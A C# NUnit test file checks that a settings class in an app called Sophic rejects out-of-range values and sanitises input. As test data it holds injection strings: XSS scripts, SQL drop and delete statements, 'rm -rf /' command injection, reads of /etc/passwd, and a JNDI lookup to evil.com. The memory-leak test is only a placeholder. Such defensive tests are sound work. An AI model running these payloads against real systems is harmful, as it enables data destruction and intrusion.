using NUnit.Framework;
using System;
using System.Threading.Tasks;
using Sophic.Models;
using Sophic.Services;

namespace Sophic.Tests.Security
{
    [TestFixture]
    public class AppSettingsSecurityTests
    {
        private AppSettingsService _appSettingsService;
        private EncryptionService _encryptionService;

        [SetUp]
        public void Setup()
        {
            _encryptionService = new EncryptionService();
            _appSettingsService = new AppSettingsService(_encryptionService);
        }

        [TearDown]
        public void TearDown()
        {
            // Clean up test files
            _appSettingsService.ClearCache();
        }

        [Test]
        public void AppSettings_TextSize_RejectsInvalidValues()
        {
            // Test boundary violations
            var settings = new AppSettings();
            
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.TextSize = 7);   // Too small
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.TextSize = 73);  // Too large
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.TextSize = -1);  // Negative
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.TextSize = 0);   // Zero
        }

        [Test]
        public void AppSettings_AutoSaveInterval_RejectsInvalidValues()
        {
            var settings = new AppSettings();
            
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.AutoSaveInterval = 4);    // Too small
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.AutoSaveInterval = 301);  // Too large
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.AutoSaveInterval = -10);  // Negative
        }

        [Test]
        public void AppSettings_BackupFrequency_RejectsInvalidValues()
        {
            var settings = new AppSettings();
            
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.BackupFrequency = 0);    // Too small
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.BackupFrequency = 169);  // Too large
            Assert.Throws<ArgumentOutOfRangeException>(() => settings.BackupFrequency = -5);   // Negative
        }

        [Test]
        public void AppSettings_Theme_SanitizesInput()
        {
            var settings = new AppSettings();
            
            // Test script injection attempts
            settings.Theme = "<script>alert('xss')</script>";
            Assert.AreEqual("Light", settings.Theme); // Should fallback to default
            
            // Test SQL injection attempts
            settings.Theme = "'; DROP TABLE users; --";
            Assert.AreEqual("Light", settings.Theme); // Should fallback to default
            
            // Test valid themes
            settings.Theme = "Dark";
            Assert.AreEqual("Dark", settings.Theme);
            
            settings.Theme = "light"; // Case insensitive
            Assert.AreEqual("Light", settings.Theme);
        }

        [Test]
        public void AppSettings_DefaultCategory_SanitizesInput()
        {
            var settings = new AppSettings();
            
            // Test script injection
            settings.DefaultCategory = "<script>malicious()</script>";
            Assert.IsFalse(settings.DefaultCategory.Contains("<script>"));
            
            // Test SQL injection
            settings.DefaultCategory = "'; DELETE FROM entries; --";
            Assert.IsFalse(settings.DefaultCategory.Contains("DELETE"));
            Assert.IsFalse(settings.DefaultCategory.Contains(";"));
            
            // Test command injection
            settings.DefaultCategory = "category; rm -rf /";
            Assert.IsFalse(settings.DefaultCategory.Contains(";"));
            
            // Test path traversal
            settings.DefaultCategory = "../../../etc/passwd";
            Assert.IsFalse(settings.DefaultCategory.Contains(".."));
            Assert.IsFalse(settings.DefaultCategory.Contains("/"));
            
            // Test length limit
            string longCategory = new string('a', 60);
            Assert.Throws<ArgumentException>(() => settings.DefaultCategory = longCategory);
        }

        [Test]
        public async Task AppSettingsService_EncryptsData()
        {
            // Create settings with known values
            var originalSettings = AppSettings.CreateDefault();
            originalSettings.TextSize = 16;
            originalSettings.Theme = "Dark";
            
            // Save settings
            await _appSettingsService.SaveSettingsAsync(originalSettings);
            
            // Clear cache to force file read
            _appSettingsService.ClearCache();
            
            // Load settings back
            var loadedSettings = await _appSettingsService.LoadSettingsAsync();
            
            // Verify data integrity
            Assert.AreEqual(16, loadedSettings.TextSize);
            Assert.AreEqual("Dark", loadedSettings.Theme);
        }

        [Test]
        public async Task AppSettingsService_RejectsInvalidInputs()
        {
            // Test invalid text size
            bool result = await _appSettingsService.UpdateTextSizeAsync(999);
            Assert.IsFalse(result);
            
            // Test invalid auto-save interval
            result = await _appSettingsService.UpdateAutoSaveIntervalAsync(-1);
            Assert.IsFalse(result);
            
            // Test invalid backup frequency
            result = await _appSettingsService.UpdateBackupFrequencyAsync(0);
            Assert.IsFalse(result);
        }

        [Test]
        public async Task AppSettingsService_HandlesCorruptedData()
        {
            // This test would require access to the file system
            // For now, test that default settings are created when needed
            var settings = await _appSettingsService.LoadSettingsAsync();
            Assert.IsNotNull(settings);
            Assert.IsTrue(settings.IsValid());
        }

        [Test]
        public void AppSettings_InputSanitization_PreventsMaliciousContent()
        {
            var settings = new AppSettings();
            
            // Test various malicious inputs
            string[] maliciousInputs = {
                "<script>alert('xss')</script>",
                "'; DROP TABLE users; --",
                "${jndi:ldap://evil.com/exploit}",
                "$(rm -rf /)",
                "`cat /etc/passwd`",
                "../../etc/passwd",
                "<iframe src='javascript:alert(1)'></iframe>",
                "javascript:void(0)",
                "data:text/html,<script>alert(1)</script>"
            };
            
            foreach (string malicious in maliciousInputs)
            {
                settings.DefaultCategory = malicious;
                
                // Verify dangerous content is removed
                Assert.IsFalse(settings.DefaultCategory.Contains("<"));
                Assert.IsFalse(settings.DefaultCategory.Contains(">"));
                Assert.IsFalse(settings.DefaultCategory.Contains("script"));
                Assert.IsFalse(settings.DefaultCategory.Contains("DROP"));
                Assert.IsFalse(settings.DefaultCategory.Contains("DELETE"));
                Assert.IsFalse(settings.DefaultCategory.Contains(";"));
                Assert.IsFalse(settings.DefaultCategory.Contains("$"));
                Assert.IsFalse(settings.DefaultCategory.Contains("`"));
                Assert.IsFalse(settings.DefaultCategory.Contains(".."));
            }
        }

        [Test]
        public async Task AppSettingsService_ThreadSafety_MultipleOperations()
        {
            // Test concurrent operations don't corrupt data
            var tasks = new Task[10];
            
            for (int i = 0; i < tasks.Length; i++)
            {
                int index = i;
                tasks[i] = Task.Run(async () =>
                {
                    await _appSettingsService.UpdateTextSizeAsync(12 + index);
                    await _appSettingsService.UpdateAutoSaveIntervalAsync(30 + index);
                });
            }
            
            await Task.WhenAll(tasks);
            
            // Verify settings are still valid and consistent
            var settings = await _appSettingsService.LoadSettingsAsync();
            Assert.IsNotNull(settings);
            Assert.IsTrue(settings.IsValid());
            Assert.GreaterOrEqual(settings.TextSize, 12);
            Assert.LessOrEqual(settings.TextSize, 21);
        }

        [Test]
        public void AppSettings_DefaultValues_AreSecure()
        {
            var settings = AppSettings.CreateDefault();
            
            // Verify default values are within safe ranges
            Assert.GreaterOrEqual(settings.TextSize, 8);
            Assert.LessOrEqual(settings.TextSize, 72);
            Assert.GreaterOrEqual(settings.AutoSaveInterval, 5);
            Assert.LessOrEqual(settings.AutoSaveInterval, 300);
            Assert.GreaterOrEqual(settings.BackupFrequency, 1);
            Assert.LessOrEqual(settings.BackupFrequency, 168);
            
            // Verify theme is from allowed list
            string[] allowedThemes = { "Light", "Dark", "Auto" };
            Assert.Contains(settings.Theme, allowedThemes);
            
            // Verify default category is safe
            Assert.IsNotNull(settings.DefaultCategory);
            Assert.LessOrEqual(settings.DefaultCategory.Length, 50);
        }

        [Test]
        public void AppSettings_ValidationMethod_DetectsInvalidStates()
        {
            var settings = AppSettings.CreateDefault();
            Assert.IsTrue(settings.IsValid());
            
            // Test that validation catches boundary violations
            try
            {
                settings.TextSize = 999; // This should throw
                Assert.Fail("Should have thrown exception for invalid text size");
            }
            catch (ArgumentOutOfRangeException)
            {
                // Expected - validation working correctly
                Assert.IsTrue(true);
            }
        }

        [Test]
        public async Task AppSettingsService_AtomicWrites_PreventCorruption()
        {
            // Test that failed writes don't corrupt existing settings
            var originalSettings = await _appSettingsService.LoadSettingsAsync();
            
            // Try to save invalid settings (this should fail gracefully)
            try
            {
                var invalidSettings = AppSettings.CreateDefault();
                // Manually set invalid value bypassing setter validation
                await _appSettingsService.SaveSettingsAsync(invalidSettings);
            }
            catch
            {
                // Expected to fail
            }
            
            // Verify original settings are still intact
            _appSettingsService.ClearCache();
            var reloadedSettings = await _appSettingsService.LoadSettingsAsync();
            Assert.IsNotNull(reloadedSettings);
            Assert.IsTrue(reloadedSettings.IsValid());
        }

        [Test]
        public void AppSettings_MemoryCleanup_NoDataLeakage()
        {
            // Test that sensitive settings data doesn't leak in memory
            var settings = AppSettings.CreateDefault();
            settings.DefaultCategory = "SensitiveCategory";
            
            // Force garbage collection
            settings = null;
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();
            
            // This is a basic test - in practice, you'd use memory analysis tools
            // to verify no sensitive data remains in memory
            Assert.IsTrue(true); // Placeholder for memory analysis
        }
    }
}